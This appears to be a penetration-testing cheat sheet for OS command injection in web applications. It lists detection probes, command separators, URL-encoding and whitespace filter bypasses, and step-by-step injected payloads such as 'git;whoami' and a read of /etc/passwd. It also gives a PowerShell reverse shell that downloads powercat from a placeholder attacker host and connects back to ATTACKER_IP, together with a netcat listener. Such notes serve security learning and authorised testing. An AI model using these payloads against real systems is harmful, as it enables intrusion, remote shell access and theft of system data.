Concept

OS Command Injection occurs when a web application executes system commands using unsanitized user input.

Example vulnerable pattern:

system("git clone " + user_input);

If input is not properly sanitized, attackers can inject additional commands.

Detection

Basic tests

  • Inject simple commands:
id
whoami
hostname

Using curl (POST example)

curl -X POST --data 'param=id' http://target/endpoint

If output changes or system responses appear → possible injection.

Enumeration

Identify OS

git version
ver

Check execution environment

(dir 2>&1 *`|echo CMD);<# rem #>echo PowerShell

Determines if commands are executed in CMD or PowerShell.

Injection Techniques

Command separators

; ls
&& whoami
| id
& dir

URL encoded separators

%3B → ;
%26%26 → &&
%7C → |

Example injection

git;ipconfig
Bypass Techniques

Encoding

git%3Bipconfig

Whitespace bypass

cat${IFS}/etc/passwd

Quotes bypass

echo "test"
echo test

Obfuscation

$(whoami)
`id`
Exploitation

Step 1 – Inject command

Archive=git;whoami

Step 2 – Enumerate system

Archive=git;hostname
Archive=git;ipconfig
Archive=git;ifconfig

Step 3 – File system access

Archive=git;dir
Archive=git;ls -la
Reverse Shell

PowerShell reverse shell (Windows)

IEX (New-Object System.Net.Webclient).DownloadString("http://attacker/powercat.ps1");powercat -c ATTACKER_IP -p 4444 -e powershell

Netcat listener

nc -nvlp 4444

Alternative simple PowerShell shell

powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."
OS / Environment Detection

Windows

ipconfig
ver

Linux

ifconfig
uname -a
Notes
  • Filters often block common separators or keywords
  • Encoding and obfuscation are key bypass techniques
  • Execution context (CMD vs PowerShell vs Bash) matters
  • Always test command concatenation behavior
  • Reverse shells depend on outbound connectivity
